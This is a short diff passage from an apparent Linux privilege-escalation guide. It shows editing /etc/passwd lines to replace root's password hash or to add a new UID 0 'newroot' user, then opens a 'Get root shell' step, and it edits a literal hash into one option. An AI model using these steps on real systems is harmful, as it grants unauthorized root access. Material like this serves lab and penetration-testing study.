@@ -21,13 +21,13 @@ openssl passwd -1 newpasswordhere
 Option A – replace root’s password hash:
 
 ```
-root:<HASH>:0:0:root:/root:/bin/bash
+root:etIsHFk/.HeMQ:0:0:root:/root:/bin/bash
 ```
 
 Option B – add a new root-equivalent user:
 
 ```
-newroot:BetIsHFk/.HeMQ:0:0:root:/root:/bin/bash
+newroot:<HASH>:0:0:root:/root:/bin/bash
 ```
 
 ### 4. Get root shell
